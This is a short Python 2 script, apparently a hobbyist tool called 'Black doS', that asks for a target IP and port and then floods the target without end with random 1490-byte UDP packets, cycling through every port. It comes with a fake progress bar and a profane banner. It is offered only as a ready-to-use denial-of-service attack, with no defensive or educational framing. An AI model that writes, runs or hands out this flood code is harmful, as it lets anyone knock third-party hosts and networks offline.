import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

print("welcome to Black doS v 1.0.0 ")

print(" Author : ufoX")
print(" Github : foxdev")

os.system("figlet DOS Attack")
print("       V  1.0.0")
print (" - - - - - - - - - - - - - - -")

print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Fucking Your Target")
print "[   Just Wait My BoY                 ] 0% "
time.sleep(5)
print "[wait   . . . .        ] 25%"
time.sleep(5)
print "[wait .............        ] 50%"
time.sleep(5)
print "[wait ...................  ] 75%"
time.sleep(5)
print "[wait .....................] 100%"
print "[ Started ( For Stop press ctrl+c / ctrl+z ]"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

